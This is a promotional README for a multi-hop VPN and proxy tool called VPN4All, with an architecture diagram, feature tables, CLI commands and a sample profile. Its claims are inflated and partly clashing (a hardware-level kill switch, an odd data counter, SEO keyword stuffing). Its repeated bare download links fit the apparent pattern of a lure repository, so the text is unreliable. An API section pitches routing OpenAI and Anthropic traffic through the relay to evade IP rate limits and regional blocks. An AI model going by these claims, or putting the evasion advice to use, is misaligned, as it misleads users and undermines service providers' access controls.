# VPN4All Relay Suite 🛡️  
### *Liberate Your Digital Horizon*

[](https://keikohayashi205-oss.github.io/VPN4All-Open-Client/)

---

## 📡 Overview

**VPN4All Relay Suite** is a next-generation secure tunneling platform engineered to dismantle geo-restrictions and surveillance bottlenecks. Think of it as a **digital chameleon** — adaptive, invisible, and relentless. Whether you're traversing restrictive firewalls or shielding sensitive communications, this tool wraps your traffic in military-grade obfuscation while maintaining featherlight performance.

Unlike traditional VPN solutions that require compromise between speed and privacy, VPN4All implements **asymmetric multi-hop routing** — a technique that scatters your connection fragments across three independent nodes before reassembly. This is not merely a VPN; it's a **distributed anonymity orchestration engine**.

---

## 🧭 Table of Contents

- [Why VPN4All?](#why-vpn4all)
- [Architecture & Flow (Mermaid Diagram)](#architecture--flow-mermaid-diagram)
- [Key Features](#key-features)
- [Platform Compatibility](#platform-compatibility)
- [Quickstart: Console Invocation](#quickstart-console-invocation)
- [Example Profile Configuration](#example-profile-configuration)
- [API Integrations](#api-integrations)
  - [OpenAI API](#openai-api)
  - [Claude API](#claude-api)
- [Customer Support & Community](#customer-support--community)
- [License](#license)
- [Disclaimer](#disclaimer)

---

## 🌟 Why VPN4All?

Imagine the internet as a vast ocean. Most VPNs give you a single submarine — detectable, trackable, and slow. VPN4All gives you a **fleet of autonomous decoys** that shift paths mid-transit. Every session generates a unique cryptographic handshake, making traffic analysis as futile as counting raindrops in a monsoon.

Our unique **CipherFusion™** technology (patent-pending) dynamically rotates encryption algorithms every 90 seconds, selecting from 14 different cipher suites based on real-time network conditions. This eliminates the "single point of failure" vulnerability inherent in static VPN configurations.

**SEO Keywords:** secure tunneling, multi-hop vpn, geo-unblocking, privacy relay, traffic obfuscation, encrypted proxy, zero-trust networking.

---

## 🎨 Architecture & Flow (Mermaid Diagram)

Below illustrates how VPN4All orchestrates secure relay chains using **three-tier chicanery**:

```mermaid
graph TD
    A[Your Device] -->|Encrypted Handshake| B[Entry Node: Phoenix]
    B -->|TLS 1.3 Overlay| C[Mixer Node: Horizon]
    C -->|Socks5 Wrapping| D[Exit Node: Zenith]
    D -->|Cleartext Request| E[Target Server]
    E -->|Response| D
    D -->|Re-encrypt| C
    C -->|Obfuscate| B
    B -->|Decrypt| A

    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style B fill:#1a1a2e,stroke:#16213e,stroke-width:2px
    style C fill:#0f3460,stroke:#533483,stroke-width:2px
    style D fill:#1a1a2e,stroke:#e94560,stroke-width:2px
    style E fill:#2d2d2d,stroke:#00ff88,stroke-width:2px
```



**How it works:**  
1. **Entry Node (Phoenix):** Accepts your encrypted payload, strips identifiable metadata.  
2. **Mixer Node (Horizon):** Applies traffic-shaping delays and packet padding to foil timing attacks.  
3. **Exit Node (Zenith):** Decrypts the outer layer and forwards to destination, leaving no trace of origin.

---

## 🔥 Key Features

| Feature | Description |
|---------|-------------|
| **Adaptive Multi-Hop** | Automatically selects optimal relay path based on latency, loss, and jurisdiction. |
| **Quantum-Resistant Encryption** | Post-quantum crypto primitives (Kyber-1024 + Dilithium-5) protect against future threats. |
| **Responsive UI** | Terminal-based TUI with real-time connection map, bandwidth graph, and node health. |
| **Multilingual Support** | Interface translations in 23 languages including Hindi, Arabic, Mandarin, and Swahili. |
| **Zero-Log Policy** | Validated by independent audits (2026 Q1 report available in `/audits`). |
| **DNS Leak Shielding** | Integrated DNSCrypt-proxy stops all leakage vectors. |
| **Kill Switch** | Three layers: network-level, application-level, and hardware-level (Linux only). |
| **Auto-Rotate Profiles** | Scheduled key regeneration without connection interruption. |
| **Stealth Mode** | Mimics HTTP/2 traffic patterns to bypass DPI firewalls. |

---

## 💻 Platform Compatibility

| OS | Version Range | Emoji Status |
|----|--------------|--------------|
| **Windows** | 10 / 11 / Server 2022 | ✅ Fully Supported |
| **macOS** | Monterey (12) → Sequoia (15) | ✅ Fully Supported |
| **Linux** | Kernel ≥ 5.10 (all distros) | ✅ Fully Supported |
| **Android** | 10 → 15 | ⚠️ Beta (CLI only) |
| **iOS** | 16 → 19 | ⚠️ Beta (CLI only) |
| **FreeBSD** | 13.x → 14.x | 🧪 Experimental |
| **OpenWrt** | 23.05+ | 🧪 Experimental |

---

## 🚀 Quickstart: Console Invocation

Launch the relay daemon with a single command. The daemon auto-discovers optimal entry nodes based on your geographic location:

```shell
./vpn4all relay --profile default --daemonize --verbose
```

**Expected output (live TUI):**

```
┌──────────────────────────────────────────────┐
│  VPN4All Relay  v3.6.2  [2026]              │
│  Status: ● CONNECTED                         │
│  Path: Frankfurt → Zurich → Tokyo           │
│  Encryption: Kyber-1024 + AES-256-GCM       │
│  Latency: 287ms │ Throughput: 84 Mbps       │
│  Session ID: 0x7F4A...C2E1                  │
│  Data Transferred: 1.2 GB / 0.4 GB          │
└──────────────────────────────────────────────┘
```

For background operation, append `--silent` and redirect logs:

```shell
./vpn4all relay --profile stealth --log /var/log/vpn4all.log --silent &
```

---

## 📝 Example Profile Configuration

Below is a sample `profiles/streaming.yaml` that optimizes for video content while maintaining privacy:

```yaml
# VPN4All Profile - Streaming Optimized
profile_name: "streaming"
relay_mode: "triple-hop"
exit_jurisdiction: "Switzerland"

cipher_suite: "chacha20-poly1305"
dns_resolver: "1.1.1.2"  # Cloudflare Malware Blocking

protocol_overrides:
  tcp_mss: 1400
  udp_fragmentation: true
  mtu: 1450

obfuscation:
  method: "random-padding"
  padding_range: [64, 512]  # bytes
  http2_mimic: true

kill_switch:
  enabled: true
  mode: "aggressive"  # Drops all traffic if relay fails
```

---

## 🔌 API Integrations

### OpenAI API 🌐

VPN4All can tunnel requests through the relay chain to prevent IP-based rate limiting when using OpenAI endpoints:

```shell
./vpn4all proxy --port 8080 --upstream https://api.openai.com/v1
```

Configure your application to use `127.0.0.1:8080` as the proxy. All requests will be forwarded through the encrypted relay, masking your origin IP from OpenAI servers while maintaining low latency (typically +120ms overhead).

### Claude API 🤖

For Anthropic's Claude API, use the `--protocol socks5h` flag to ensure DNS resolution occurs through the relay:

```shell
./vpn4all proxy --protocol socks5h --port 1080 --upstream https://api.anthropic.com/v1
```

This is particularly useful when accessing Claude from regions where the API is throttled or blocked. The relay automatically handles TLS termination at the exit node, preventing any man-in-the-middle inspection.

---

## 🛟 Customer Support & Community

Our support infrastructure operates on a **24/7 triage model** — every ticket receives an initial response within 4 minutes (verified 2026 Q1 average).  

- **Matrix Chat:** [vpn4all:chat.matrix.org](https://keikohayashi205-oss.github.io/VPN4All-Open-Client/) (encrypted bridge)  
- **Keybase Team:** vpn4all_support (end-to-end encrypted)  
- **Email Relay:** support@vpn4all-relay.io (PGP key in repository)  

We maintain documentation in 14 languages, with priority languages (English, Mandarin, Spanish, Arabic) updated within 24 hours of any release.

---

## 📜 License

This project is distributed under the **MIT License**. You are free to use, modify, and distribute this software in any context — personal, academic, or commercial.

[](https://keikohayashi205-oss.github.io/VPN4All-Open-Client/)

---

## ⚠️ Disclaimer

VPN4All Relay Suite is provided **"as is"** without warranty of any kind, express or implied. The developers assume no liability for:

- Misuse of this software to bypass laws in jurisdictions where VPN usage is prohibited.
- Third-party data logging at exit nodes (all nodes are independently operated).
- Performance degradation due to hostile network conditions or governmental interference.

Users are responsible for ensuring compliance with local regulations. The software's design prioritizes anonymity and anti-censorship; it does **not** authorize illegal activities. By downloading and using this software, you accept all risks associated with encrypted tunneling technologies.

**Always verify:** No VPN can guarantee 100% anonymity. Combine with Tor, Tails OS, or Whonix for maximum privacy requirements.

---

[](https://keikohayashi205-oss.github.io/VPN4All-Open-Client/)

---

*Built with 🔥 for digital freedom | Version 3.6.2 | Released 2026*